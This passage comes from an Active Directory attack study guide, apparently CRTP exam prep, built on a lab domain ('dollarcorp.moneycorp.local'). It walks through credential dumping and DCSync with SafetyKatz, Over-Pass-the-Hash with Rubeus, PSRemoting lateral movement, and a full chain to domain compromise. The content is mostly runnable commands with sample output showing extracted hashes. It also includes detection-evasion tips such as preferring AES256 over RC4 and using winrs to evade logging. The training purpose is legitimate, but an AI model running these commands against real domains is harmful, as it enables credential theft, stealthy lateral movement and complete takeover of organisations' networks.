│  ├── Local Admin on Domain Controller?                           │
│  │   └── → lsadump::lsa /patch (ALL domain user hashes!)        │
│  │       → sekurlsa::logonPasswords (recently authed users)     │
│  │                                                               │
│  └── Regular domain user?                                        │
│      └── → vault::cred (your own saved creds)                   │
│          → DPAPI files (your own encrypted data)                │
│          → Kerberoasting (request service tickets → crack)       │
│          → ASREPRoasting (users without preauth)                │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## DCSync — Extract Credentials Without Code Execution on the DC

### What is DCSync?

DCSync simulates the behavior of a Domain Controller by using the **Directory Replication Service Remote Protocol (MS-DRSR)**. It requests the DC to replicate password data — the same way legitimate DCs synchronize with each other.

```
┌──────────────────────────────────────────────────────────────────┐
│                     DCSYNC ATTACK FLOW                            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  NORMAL DC REPLICATION:                                          │
│  ┌────────┐  DsGetNCChanges()  ┌────────┐                       │
│  │  DC-01 │ ◄────────────────► │  DC-02 │                       │
│  │        │  "Give me updates" │        │                       │
│  └────────┘                    └────────┘                       │
│                                                                  │
│  DCSYNC ATTACK:                                                  │
│  ┌────────────────────┐  DsGetNCChanges()  ┌────────┐           │
│  │  Attacker Machine  │ ────────────────►  │  DC-01 │           │
│  │  (with DA privs)   │  "I'm a DC, give   │        │           │
│  │                    │   me the hashes!"   │        │           │
│  │  SafetyKatz.exe    │ ◄────────────────   │        │           │
│  │  lsadump::dcsync   │  Here are the       │        │           │
│  │                    │  password hashes     │        │           │
│  └────────────────────┘                    └────────┘           │
│                                                                  │
│  ★ NO code execution on the DC!                                 │
│  ★ NO touching LSASS on the DC!                                 │
│  ★ Pure network-based — just an RPC call!                       │
│  ★ Incredibly stealthy if not monitored                         │
│                                                                  │
│  REQUIRED PRIVILEGES:                                            │
│  ┌─────────────────────────────────────────────────┐             │
│  │ By default, these groups can perform DCSync:    │             │
│  │ • Domain Admins                                 │             │
│  │ • Enterprise Admins                             │             │
│  │ • Domain Controllers                            │             │
│  │                                                  │             │
│  │ Specifically needs these AD permissions:         │             │
│  │ • Replicating Directory Changes                 │             │
│  │ • Replicating Directory Changes All             │             │
│  │ • (Optional) Replicating Directory Changes      │             │
│  │   In Filtered Set                               │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### DCSync: Extracting the krbtgt Hash

The **krbtgt** account hash is the ultimate prize — with it, you can forge **Golden Tickets** and achieve persistent domain dominance.

```powershell
# ============================================================
# DCSYNC — Extract krbtgt hash (requires DA privileges)
# ============================================================

# Using SafetyKatz (CRTP's preferred tool)
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Using SafetyKatz for a specific domain
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local" "exit"

# Extract Administrator hash
SafetyKatz.exe "lsadump::dcsync /user:dcorp\Administrator" "exit"

# Extract ALL hashes (bulk extraction)
SafetyKatz.exe "lsadump::dcsync /all /csv" "exit"

# Extract a specific service account
SafetyKatz.exe "lsadump::dcsync /user:dcorp\svc_sqlserver" "exit"
```

#### Example Output: DCSync for krbtgt

```
PS C:\AD\Tools> SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 11/11/2022 11:59:25 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688200-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: 00000000000000000000000000000000

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e728f9cc6975e264e22adb0ced3c5918
      des_cbc_md5       (4096) : 150867a88bb23e50

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150867a88bb23e50

* Packages *
    Kerberos

* Primary:WDigest *
    01  3e0e3d7e0b3e...
```

### What You Get from DCSync

```
┌──────────────────────────────────────────────────────────────────┐
│              DCSYNC OUTPUT — WHAT YOU GET                         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  For EACH user account, you receive:                             │
│                                                                  │
│  ┌────────────────────┬──────────────────────────────────┐       │
│  │ Credential Type    │ What It Enables                  │       │
│  ├────────────────────┼──────────────────────────────────┤       │
│  │ NT Hash (NTLM)     │ Pass-the-Hash attacks            │       │
│  │                    │ Over-Pass-the-Hash (OPTH)        │       │
│  │                    │ Offline password cracking         │       │
│  │                    │                                  │       │
│  │ AES256 Key         │ Over-Pass-the-Hash (more OPSEC) │       │
│  │                    │ Golden Ticket (with krbtgt)      │       │
│  │                    │ Silver Ticket                    │       │
│  │                    │                                  │       │
│  │ AES128 Key         │ Same as AES256, less preferred   │       │
│  │                    │                                  │       │
│  │ DES Key            │ Legacy — rarely needed           │       │
│  │                    │                                  │       │
│  │ Password History   │ Previous passwords (may be reused│       │
│  │                    │ on other systems)                │       │
│  └────────────────────┴──────────────────────────────────┘       │
│                                                                  │
│  ★ For krbtgt specifically:                                     │
│  │  NT Hash + AES256 Key = GOLDEN TICKET                        │
│  │  → Forge TGTs for ANY user                                   │
│  │  → Survives password resets (until krbtgt reset 2x)          │
│  │  → Complete and persistent domain dominance                  │
│  │                                                               │
│  ★ For machine accounts:                                        │
│  │  → Silver Tickets for specific services                      │
│  │  → Unconstrained delegation abuse                            │
│  │                                                               │
│  ★ For service accounts:                                        │
│     → Access databases, APIs, backup infrastructure             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Check Who Can Perform DCSync

```powershell
# ============================================================
# ENUMERATE DCSYNC PERMISSIONS
# ============================================================

# Using PowerView — find users with Replicating Directory Changes rights
Import-Module .\PowerView.ps1

# Find all ACEs that grant replication rights
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base `
    -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match "Replicating" -or
    $_.ActiveDirectoryRights -match "GenericAll"
} | ForEach-Object {
    [PSCustomObject]@{
        Principal = Convert-SidToName $_.SecurityIdentifier
        Right     = $_.ObjectAceType
    }
} | Format-Table -AutoSize
```

#### Example Output

```
Principal                   Right
---------                   -----
DCORP\Domain Admins         DS-Replication-Get-Changes-All
DCORP\Enterprise Admins     DS-Replication-Get-Changes-All
DCORP\Domain Controllers    DS-Replication-Get-Changes-All
DCORP\Domain Admins         DS-Replication-Get-Changes
DCORP\Enterprise Admins     DS-Replication-Get-Changes
DCORP\svc_azureadconnect    DS-Replication-Get-Changes
```

---

## Over-Pass-the-Hash (OPTH)

### What is Over-Pass-the-Hash?

**Over-Pass-the-Hash (OPTH)** is a technique that generates **Kerberos tokens (TGTs) from NT hashes or AES keys** — converting an NTLM credential into a Kerberos ticket. This is critical because many services require Kerberos authentication.

```
┌──────────────────────────────────────────────────────────────────┐
│           OVER-PASS-THE-HASH (OPTH) EXPLAINED                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  NORMAL Authentication:                                          │
│  User → Password → KDC → TGT (Kerberos Ticket)                  │
│                                                                  │
│  Pass-the-Hash (PtH):                                            │
│  Attacker → NT Hash → NTLM Auth → Access (NTLM services only)   │
│                                                                  │
│  Over-Pass-the-Hash (OPTH):                                      │
│  Attacker → NT Hash/AES Key → KDC → TGT → Access (ALL services!)│
│                                                                  │
│  ┌────────────────────────────────────────────────────────┐      │
│  │                                                        │      │
│  │  PtH:   Hash ──────────────────────► NTLM Services    │      │
│  │                                      (SMB, HTTP-NTLM)  │      │
│  │                                                        │      │
│  │  OPTH:  Hash ──► KDC ──► TGT ──────► ALL Services     │      │
│  │              request TGT              (Kerberos!)       │      │
│  │              using hash as           • WinRM             │      │
│  │              encryption key          • MSSQL             │      │
│  │                                      • LDAP              │      │
│  │                                      • SMB               │      │
│  │                                      • HTTP              │      │
│  │                                      • RDP (restricted)  │      │
│  │                                      • Everything!       │      │
│  │                                                        │      │
│  └────────────────────────────────────────────────────────┘      │
│                                                                  │
│  WHY OPTH > PTH:                                                 │
│  • Many services REQUIRE Kerberos (reject NTLM)                 │
│  • Kerberos is less likely to trigger NTLM monitoring alerts     │
│  • TGT can request TGS for ANY service the user has access to   │
│  • More versatile for lateral movement                           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### OPTH Encryption Key Priority

```
┌──────────────────────────────────────────────────────────────────┐
│            OPTH KEY TYPES & OPSEC COMPARISON                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────┬──────────────────┬─────────────┬──────────────┐ │
│  │ Key Type    │ Mimikatz/Safety  │ OPSEC Level │ Elevation    │ │
│  │             │ Parameter        │             │ Required?    │ │
│  ├─────────────┼──────────────────┼─────────────┼──────────────┤ │
│  │ AES256      │ /aes256:         │ ★★★★★ BEST │ YES          │ │
│  │             │                  │ Looks like  │              │ │
│  │             │                  │ normal auth │              │ │
│  │             │                  │             │              │ │
│  │ AES128      │ /aes128:         │ ★★★★☆ GOOD │ YES          │ │
│  │             │                  │ AES is the  │              │ │
│  │             │                  │ default     │              │ │
│  │             │                  │             │              │ │
│  │ RC4 (NTLM) │ /rc4:            │ ★★☆☆☆ NOISY│ NO           │ │
│  │             │ or /ntlm:        │ Downgrade   │ (Rubeus)     │ │
│  │             │                  │ to RC4 is   │              │ │
│  │             │                  │ anomalous!  │              │ │
│  └─────────────┴──────────────────┴─────────────┴──────────────┘ │
│                                                                  │
│  ★ CRTP TIP: Always prefer AES256 for OPSEC                    │
│    RC4/NTLM triggers "Kerberos encryption downgrade" alerts!    │
│    Modern DCs typically use AES256 — RC4 stands out in logs.    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### OPTH with Rubeus (CRTP Primary Tool)

```powershell
# ============================================================
# RUBEUS — OVER-PASS-THE-HASH
# ============================================================

# Method 1: Using RC4/NTLM hash (does NOT need elevation)
Rubeus.exe asktgt /user:administrator /rc4:a87f3a337d73085c45f9416be5787d86 /ptt

# Method 2: Using AES256 key (NEEDS elevation, but better OPSEC!)
Rubeus.exe asktgt /user:administrator /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Method 3: Using AES256 with specific domain
Rubeus.exe asktgt /user:administrator /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Method 4: Request ticket and save to file (for later use)
Rubeus.exe asktgt /user:svcadmin /rc4:a87f3a337d73085c45f9416be5787d86 /outfile:svcadmin.kirbi

# Method 5: Import a saved ticket
Rubeus.exe ptt /ticket:svcadmin.kirbi
```

#### Rubeus Flags Explained

```
┌──────────────────────────────────────────────────────────────────┐
│              RUBEUS ASKTGT FLAGS REFERENCE                        │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  /user:           Target username to impersonate                 │
│  /domain:         Target domain (auto-detected if omitted)       │
│  /rc4:            NT hash (RC4 encryption for AS-REQ)            │
│  /aes256:         AES-256 key (preferred for OPSEC)              │
│  /aes128:         AES-128 key (alternative)                      │
│  /ptt             Pass-the-Ticket — inject into current session  │
│  /opsec           Use OPSEC-safe options in the AS-REQ           │
│                   (avoids sending extra encryption types)        │
│  /createnetonly:  Create a new process with logon type 9         │
│                   (same as runas /netonly)                       │
│  /show            Show the window of the created process         │
│  /outfile:        Save ticket to file instead of injecting       │
│  /dc:             Target specific DC (useful for multi-DC envs)  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Example Output: Rubeus OPTH with RC4

```
PS C:\AD\Tools> Rubeus.exe asktgt /user:administrator /rc4:a87f3a337d73085c45f9416be5787d86 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: a87f3a337d73085c45f9416be5787d86
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmjCCBZagAwIBBaEDAgEWooIEpTCCBKFhggSdMIIEmaBCAQA...

[*] Action: Import Ticket
[+] Ticket successfully imported!

ServiceName              :  krbtgt/dollarcorp.moneycorp.local
ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
UserName                 :  administrator
UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
StartTime                :  4/8/2026 2:30:15 PM
EndTime                  :  4/9/2026 12:30:15 AM
RenewTill                :  4/15/2026 2:30:15 PM
Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
KeyType                  :  rc4_hmac
Base64(key)              :  ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef

PS C:\AD\Tools> klist

Current LogonId is 0:0x1a2b3c

Cached Tickets: (1)

#0>     Client: administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/8/2026 14:30:15 (local)
        End Time:   4/9/2026 0:30:15 (local)
        Renew Time: 4/15/2026 14:30:15 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)

PS C:\AD\Tools> dir \\dcorp-dc\C$
    Directory: \\dcorp-dc\C$

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d-----       11/11/2022  11:00 AM            PerfLogs
d-r---        4/08/2026  10:00 AM            Program Files
d-r---       11/11/2022  10:30 AM            Program Files (x86)
d-r---        4/08/2026   2:00 PM            Users
d-----        4/08/2026   1:00 PM            Windows

[+] SUCCESS! We have admin access to the Domain Controller!
```

#### Example Output: Rubeus OPTH with AES256 (Better OPSEC)

```
PS C:\AD\Tools> Rubeus.exe asktgt /user:administrator /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Target LUID: 0x5a4e2f
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[+] TGT request successful!

[*] Action: Create Process (/netonly)

[*] Showing process : True
[*] Username        : YOURMACHINE
[*] Domain          : YOURMACHINE
[*] Password        : <random>
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LUID 0x5a4e2f
[+] ProcessID       : 7284
[+] Ticket successfully imported into LUID 0x5a4e2f

[*] Action: Import Ticket
[+] Ticket successfully imported!

ServiceName              :  krbtgt/dollarcorp.moneycorp.local
ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
UserName                 :  administrator
UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
StartTime                :  4/8/2026 2:35:00 PM
EndTime                  :  4/9/2026 12:35:00 AM
Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
KeyType                  :  aes256_cts_hmac_sha1

★ A new cmd.exe window opens with the administrator's Kerberos ticket!
★ Logon Type 9 — same as runas /netonly
```

### OPTH with SafetyKatz (Requires Elevation)

```powershell
# ============================================================
# SAFETYKATZ — OVER-PASS-THE-HASH (Needs elevation / Run as Admin)
# ============================================================

# Using AES256 key (best OPSEC)
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe" "exit"

# Using NTLM hash
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /ntlm:a87f3a337d73085c45f9416be5787d86 /run:cmd.exe" "exit"

# Using AES128 key
SafetyKatz.exe "sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes128:b65ea8151f13a31d01377f5934bf3883 /run:powershell.exe" "exit"
```

#### Example Output: SafetyKatz OPTH

```
PS C:\AD\Tools> SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe

user    : administrator
domain  : dollarcorp.moneycorp.local
program : cmd.exe
impers. : no
AES256  : 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
  |  PID  7832
  |  TID  7836
  |  LSA Process is now R/W
  |  LUID 0 ; 5863432 (00000000:00597008)
  \_ msv1_0   - data copy @ 0000021C4B8E7A30 : OK !
  \_ kerberos - data copy @ 0000021C4B93C4C8
   \_ aes256_hmac       -> null
   \_ aes256_hmac       OK
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       -> null
   \_ rc4_hmac_old      -> null
   \_ rc4_md4           -> null
   \_ rc4_hmac_nt_exp   -> null
   \_ rc4_hmac_old_exp  -> null

★ A new cmd.exe window opens with Logon Type 9 (netonly)!
★ The new process has administrator's Kerberos credentials!
```

### Understanding Logon Type 9

```
┌──────────────────────────────────────────────────────────────────┐
│                LOGON TYPE 9 EXPLAINED                             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  When SafetyKatz or Rubeus creates a new process with            │
│  /createnetonly or /run:, it uses Logon Type 9.                  │
│                                                                  │
│  This is IDENTICAL to running:                                   │
│  runas /netonly /user:dcorp\administrator cmd.exe                │
│                                                                  │
│  What Logon Type 9 means:                                        │
│  ┌─────────────────────────────────────────────────┐             │
│  │ LOCAL:   You are still YOUR current user         │             │
│  │          whoami → still shows student1            │             │
│  │                                                   │             │
│  │ NETWORK: You authenticate as the TARGET user      │             │
│  │          dir \\dc\c$ → uses administrator creds   │             │
│  │                                                   │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  In the new cmd.exe window:                                      │
│  ┌─────────────────────────────────────────────────┐             │
│  │ C:\> whoami                                      │             │
│  │ dcorp\student1    ← Local identity unchanged     │             │
│  │                                                   │             │
│  │ C:\> dir \\dcorp-dc\C$                            │             │
│  │ [SUCCESS!]        ← Network uses administrator   │             │
│  │                                                   │             │
│  │ C:\> Enter-PSSession -ComputerName dcorp-dc       │             │
│  │ [dcorp-dc]: PS C:\> whoami                        │             │
│  │ dcorp\administrator ← Remote session as admin!   │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Post-OPTH: Verifying Access

```powershell
# ============================================================
# AFTER OPTH — Verify and Use Your New Access
# ============================================================

# Check current tickets
klist

# Verify access to the DC
dir \\dcorp-dc\C$

# Start a PSSession to the DC
Enter-PSSession -ComputerName dcorp-dc

# On the DC, verify you're administrator
[dcorp-dc]: PS C:\> whoami
# dcorp\administrator

# Now you can perform domain-level operations!
[dcorp-dc]: PS C:\> net user /domain | Select-Object -First 20

# Or run DCSync from this session
[dcorp-dc]: PS C:\> SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

---

## Complete Lateral Movement Attack Chain

```
┌──────────────────────────────────────────────────────────────────┐
│         COMPLETE LATERAL MOVEMENT ATTACK CHAIN                   │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  PHASE 1: Initial Credential Extraction                          │
│  ┌─────────────────────────────────────────┐                     │
│  │ On compromised workstation:             │                     │
│  │ SafetyKatz.exe "sekurlsa::ekeys" "exit" │                     │
│  │ → Extract AES256 keys and NT hashes     │                     │
│  └──────────────────┬──────────────────────┘                     │
│                     │ Found: svcadmin AES256 key                 │
│                     ▼                                            │
│  PHASE 2: Over-Pass-the-Hash                                     │
│  ┌─────────────────────────────────────────┐                     │
│  │ Rubeus.exe asktgt /user:svcadmin        │                     │
│  │   /aes256:<key> /opsec                  │                     │
│  │   /createnetonly:cmd.exe /show /ptt     │                     │
│  │ → New cmd.exe with svcadmin's TGT       │                     │
│  └──────────────────┬──────────────────────┘                     │
│                     │                                            │
│                     ▼                                            │
│  PHASE 3: Lateral Movement via PSRemoting                        │
│  ┌─────────────────────────────────────────┐                     │
│  │ From the new cmd.exe:                   │                     │
│  │ Enter-PSSession dcorp-adminsrv          │                     │
│  │ OR: winrs -remote:dcorp-adminsrv cmd    │                     │
│  │ → Now on dcorp-adminsrv as svcadmin     │                     │
│  └──────────────────┬──────────────────────┘                     │
│                     │ Found: DA credentials in LSASS             │
│                     ▼                                            │
│  PHASE 4: Extract DA Credentials                                 │
│  ┌─────────────────────────────────────────┐                     │
│  │ SafetyKatz.exe "sekurlsa::ekeys" "exit" │                     │
│  │ → Domain Admin AES256 key extracted!    │                     │
│  └──────────────────┬──────────────────────┘                     │
│                     │                                            │
│                     ▼                                            │
│  PHASE 5: OPTH to Domain Controller                              │
│  ┌─────────────────────────────────────────┐                     │
│  │ Rubeus.exe asktgt /user:administrator   │                     │
│  │   /aes256:<DA_key> /opsec /ptt         │                     │
│  │ Enter-PSSession dcorp-dc                │                     │
│  │ → We're on the DC!                      │                     │
│  └──────────────────┬──────────────────────┘                     │
│                     │                                            │
│                     ▼                                            │
│  PHASE 6: DCSync (Domain Dominance)                              │
│  ┌─────────────────────────────────────────┐                     │
│  │ SafetyKatz.exe "lsadump::dcsync         │                     │
│  │   /user:dcorp\krbtgt" "exit"            │                     │
│  │ → krbtgt hash extracted!                │                     │
│  │ → Can now forge Golden Tickets          │                     │
│  │ → COMPLETE DOMAIN COMPROMISE!           │                     │
│  └─────────────────────────────────────────┘                     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## CRTP Quick Reference Card

```
┌──────────────────────────────────────────────────────────────────┐
│                CRTP LATERAL MOVEMENT CHEAT SHEET                 │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ═══ PSREMOTING (ONE-TO-ONE) ═══                                 │
│  $sess = New-PSSession -ComputerName server1                     │
│  Enter-PSSession -Session $sess                                  │
│  Exit-PSSession                                                  │
│                                                                  │
│  ═══ PSREMOTING (ONE-TO-MANY) ═══                                │
│  Invoke-Command -ScriptBlock {Get-Process} `                     │
│    -ComputerName (Get-Content servers.txt)                       │
│  Invoke-Command -FilePath C:\script.ps1 `                        │
│    -ComputerName (Get-Content servers.txt)                       │
│  Invoke-Command -ScriptBlock ${function:Func-Name} `             │
│    -ComputerName (Get-Content servers.txt) -ArgumentList args    │
│                                                                  │
│  ═══ STATEFUL INVOKE-COMMAND ═══                                 │
│  $Sess = New-PSSession -ComputerName Server1                     │
│  Invoke-Command -Session $Sess -ScriptBlock {$x = Get-Process}   │
│  Invoke-Command -Session $Sess -ScriptBlock {$x.Name}            │
│                                                                  │
│  ═══ EVADE LOGGING ═══                                           │
│  winrs -remote:server1 -u:domain\user -p:Pass hostname           │
│                                                                  │
│  ═══ CREDENTIAL EXTRACTION ═══                                   │
│  SafetyKatz.exe "sekurlsa::logonPasswords" "exit"  # LSASS       │
│  SafetyKatz.exe "sekurlsa::ekeys" "exit"           # Kerb keys   │
│  SafetyKatz.exe "lsadump::sam" "exit"              # Local hashes│
│  SafetyKatz.exe "lsadump::secrets" "exit"          # LSA secrets │
│  SafetyKatz.exe "lsadump::cache" "exit"            # Cached creds│
│  SafetyKatz.exe "vault::cred" "exit"               # DPAPI vault │
│                                                                  │
│  ═══ DCSYNC ═══                                                  │
│  SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"     │
│  SafetyKatz.exe "lsadump::dcsync /all /csv" "exit"              │
│                                                                  │
│  ═══ OVER-PASS-THE-HASH ═══                                     │
│  # No elevation needed (RC4):                                    │
│  Rubeus.exe asktgt /user:admin /rc4:<hash> /ptt                  │
│                                                                  │
│  # Needs elevation (AES256 — better OPSEC):                      │
│  Rubeus.exe asktgt /user:admin /aes256:<key> /opsec `            │
│    /createnetonly:C:\Windows\System32\cmd.exe /show /ptt         │
│                                                                  │
│  # SafetyKatz (needs elevation):                                 │
│  SafetyKatz.exe "sekurlsa::pth /user:admin `                     │
│    /domain:corp.local /aes256:<key> /run:cmd.exe" "exit"         │
│                                                                  │
│  ═══ VERIFY ACCESS ═══                                           │
│  klist                           # Check tickets                 │
│  dir \\dcorp-dc\C$               # Test admin access             │
│  Enter-PSSession dcorp-dc        # Interactive shell on DC       │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## References

- [Microsoft Docs — PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)
- [WinRM Lateral Movement — Penetration Testing Lab](https://pentestlab.blog/2018/05/15/lateral-movement-winrm/)
- [Stealthy Lateral Movement with WinRM — Practical Security Analytics](https://practicalsecurityanalytics.com/stealthy-lateral-movement-techniques-with-winrm/)
- [WSMan-WinRM — bohops (GitHub)](https://github.com/bohops/WSMan-WinRM)
- [Rubeus — GhostPack (GitHub)](https://github.com/GhostPack/Rubeus)
- [Over-Pass-the-Hash Attacks — Juggernaut Pentesting](https://juggernaut-sec.com/over-pass-the-hash-attacks/)
- [DCSync Active Directory Attack — Security Scientist](https://www.securityscientist.net/blog/dcsync-active-directory-attack/)
- [DCSync Attack Protection — SentinelOne](https://www.sentinelone.com/blog/active-directory-dcsync-attacks/)
- [Credential Dumping LSASS — Hacking Articles](https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/)
- [CRTP Notes — dev-angelist GitBook](https://dev-angelist.gitbook.io/crtp-notes/)
- [MITRE ATT&CK T1021.006 — Remote Services: WinRM](https://attack.mitre.org/techniques/T1021/006/)
- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
- [MITRE ATT&CK T1550.002 — Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
